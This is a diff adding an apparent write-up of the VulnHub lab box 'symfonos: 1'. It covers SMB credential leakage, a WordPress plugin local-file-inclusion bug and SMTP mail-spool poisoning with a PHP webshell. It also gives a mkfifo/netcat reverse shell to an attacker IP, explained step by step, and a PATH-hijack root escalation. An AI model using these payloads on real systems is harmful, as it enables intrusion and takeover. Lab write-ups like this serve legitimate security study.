@@ -1,0 +1,229 @@
+---
+title: "symfonos: 1"
+platform: "VulnHub"
+difficulty: "Easy"
+os: "Linux"
+date: "2026-06-12"
+tags: ["linux", "smb", "wordpress", "lfi", "smtp-poisoning", "suid", "path-hijack"]
+description: "VulnHub box with SMB shares leaking credentials, a WordPress plugin with an LFI vulnerability, and SMTP log poisoning to achieve RCE. Root came from a SUID binary calling curl without a full path — PATH hijack gets the shell."
+status: "complete"
+---
+
+---
+
+## 1. Information Gathering
+
+<TerminalOutput
+  cmd="nmap -A -T5 10.0.0.19"
+  rawHref="/writeups/raw/symfonos-1/nmap.txt"
+  output={`PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6
+25/tcp  open  smtp        Postfix smtpd
+80/tcp  open  http        Apache httpd 2.4.25 (Debian)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
+445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian`}
+/>
+
+SSH, SMTP, HTTP, and SMB. The SMTP port is interesting — comes into play later.
+
+---
+
+## 2. SMB Enumeration
+
+<TerminalOutput
+  cmd="enum4linux 10.0.0.19"
+  rawHref="/writeups/raw/symfonos-1/enum4linux.txt"
+  output={`user:[helios] rid:[0x3e8]
+
+Sharename       Type      Comment
+---------       ----      -------
+print$          Disk      Printer Drivers
+helios          Disk      Helios personal share
+anonymous       Disk
+IPC$            IPC       IPC Service
+
+//10.0.0.19/anonymous   Mapping: OK Listing: OK
+//10.0.0.19/helios      Mapping: DENIED`}
+/>
+
+One user: `helios`. Anonymous share is open, `helios` share is password protected.
+
+<TerminalOutput
+  cmd="smbclient //10.0.0.19/anonymous -N"
+  output={`smb: \\> get attention.txt`}
+/>
+
+`attention.txt` reads:
+
+<TerminalOutput
+  cmd="cat attention.txt"
+  output={`Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'!
+
+Next person I find using one of these passwords will be fired!
+
+-Zeus`}
+/>
+
+That's a hint dressed as a warning. Try those passwords on the `helios` share — `qwerty` works.
+
+<TerminalOutput
+  cmd="smbclient //10.0.0.19/helios -U helios%qwerty"
+  output={`smb: \\> ls
+  research.txt
+  todo.txt`}
+/>
+
+`todo.txt` has the important line:
+
+<TerminalOutput
+  cmd="cat todo.txt"
+  output={`1. Binge watch Dexter
+2. Dance
+3. Work on /h3l105`}
+/>
+
+`/h3l105` is a path on the web server.
+
+---
+
+## 3. WordPress LFI
+
+Browsing to `http://10.0.0.19/h3l105` lands on a WordPress site. The installed `site-editor` plugin has a well-known LFI vulnerability in `ajax_shortcode_pattern.php` — the `ajax_path` parameter is passed directly to a file include with no sanitisation.
+
+<Screenshot
+  src="/screenshots/symfonos-1/lfi-burp.png"
+  alt="Burp Repeater showing GET request to the site-editor ajax_shortcode_pattern.php endpoint with ajax_path=/var/mail/helios"
+  caption="LFI request in Burp — ajax_path points straight at helios's mail file"
+/>
+
+Confirming LFI by reading `/etc/passwd`:
+
+<Screenshot
+  src="/screenshots/symfonos-1/lfi-etcpasswd.png"
+  alt="Burp Repeater showing LFI request with ajax_path=/etc/passwd and full /etc/passwd contents in the response"
+  caption="LFI confirmed — /etc/passwd returned in full"
+/>
+
+The interesting target is `/var/mail/helios`. If a PHP payload lands in there, including it through LFI executes it.
+
+---
+
+## 4. SMTP Log Poisoning
+
+Port 25 is Postfix, and it accepts mail for `helios@symfonos.localdomain`. Connecting via telnet and sending a message with a PHP webshell as the body writes that shell directly into helios's mail spool.
+
+<TerminalOutput
+  cmd="telnet 10.0.0.19 25"
+  rawHref="/writeups/raw/symfonos-1/smtp-poison.txt"
+  output={`220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
+EHLO test
+250 symfonos.localdomain
+MAIL FROM: arcy@hackerpwn.com
+250 2.1.0 Ok
+RCPT TO: helios@symfonos.localdomain
+250 2.1.5 Ok
+DATA
+354 End data with <CR><LF>.<CR><LF>
+<?php system($_GET['c']); ?>
+.
+250 2.0.0 Ok: queued as 8482540852`}
+/>
+
+Now `/var/mail/helios` contains our PHP. The LFI includes it and PHP executes it. Adding `?c=id` confirms RCE:
+
+<Screenshot
+  src="/screenshots/symfonos-1/lfi-rce-id.png"
+  alt="Burp Repeater showing LFI request with ajax_path=/var/mail/helios&c=id, response shows uid=1000(helios)"
+  caption="RCE confirmed — id returns uid=1000(helios), Apache runs as helios on this box"
+/>
+
+---
+
+## 5. Getting a Shell — mkfifo
+
+Now that we have RCE through a GET parameter, we need an interactive shell. A standard bash reverse shell doesn't work here because the process isn't attached to a terminal — there's no stdin. `mkfifo` solves this by creating a named pipe that wires stdin back into the shell manually.
+
+The full command, URL-encoded and passed via `?c=`:
+
+```
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.0.0.99 9001 > /tmp/f
+```
+
+**How it works, step by step:**
+
+- `rm /tmp/f` — remove any leftover file at that path so `mkfifo` doesn't fail.
+- `mkfifo /tmp/f` — create a **named pipe** at `/tmp/f`. A named pipe is a special file that lives on the filesystem but behaves like a Unix pipe: data written to one end is read from the other end in order, and nothing is stored on disk. The key property is that reads block until data is available — so the pipe can sit idle until the attacker sends a command.
+- `cat /tmp/f` — reads continuously from the pipe. Anything written into `/tmp/f` comes out of `cat`'s stdout.
+- `| /bin/bash -i 2>&1` — pipes that output into bash as commands. `bash -i` runs interactively so it processes each command as it arrives. `2>&1` merges stderr into stdout so error messages come back too.
+- `| nc 10.0.0.99 9001` — pipes bash's output (command results) over the network to our netcat listener on port 9001.
+- `> /tmp/f` — redirects what netcat **receives** (our typed commands) back into the named pipe.
+
+The loop this creates:
+
+```
+attacker types command
+  → nc sends it over TCP
+    → lands in /tmp/f (via > /tmp/f)
+      → cat /tmp/f reads it
+        → bash -i executes it
+          → output goes to nc (via pipe)
+            → nc sends output back to attacker
+```
+
+The named pipe is what makes this bidirectional over a single netcat connection. Without it, we'd have stdout going one way with no way to push stdin back — the shell would run but we couldn't type into it.
+
+<Screenshot
+  src="/screenshots/symfonos-1/mkfifo-shell.png"
+  alt="Burp request with mkfifo payload in c= parameter, terminal window showing nc -lvnp 9001 catching a connection from 10.0.0.19 and dropping into a shell prompt"
+  caption="mkfifo payload triggered through the LFI endpoint — nc catches the connection as helios"
+/>
+
+---
+
+## 6. Privilege Escalation — SUID PATH Hijack
+
+<TerminalOutput
+  cmd="find / -perm -u=s -type f 2>/dev/null"
+  output={`/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/opt/statuscheck
+/bin/mount
+/bin/umount
+/bin/su
+/bin/ping`}
+/>
+
+`/opt/statuscheck` is SUID root and not a standard system binary. Running `strings` on it shows what it does:
+
+<TerminalOutput
+  cmd="strings /opt/statuscheck"
+  output={`curl -I H
+http://lH
+ocalhostH`}
+/>
+
+It calls `curl -I http://localhost` — but without the full path. That means it relies on `PATH` to find `curl`, which we control.
+
+Create a fake `curl` that spawns a shell:
+
+<TerminalOutput
+  cmd="echo '#!/bin/sh' > /tmp/curl && echo '/bin/sh' >> /tmp/curl && chmod +x /tmp/curl"
+  output={``}
+/>
+
+Prepend `/tmp` to PATH so our fake curl takes priority, then run the binary:
+
+<TerminalOutput
+  cmd="export PATH=/tmp:$PATH && /opt/statuscheck"
+  output={`# whoami
+root`}
+/>
+
+<Note type="flag">
+  **proof.txt** — `Congrats on rooting symfonos:1!`
+</Note>
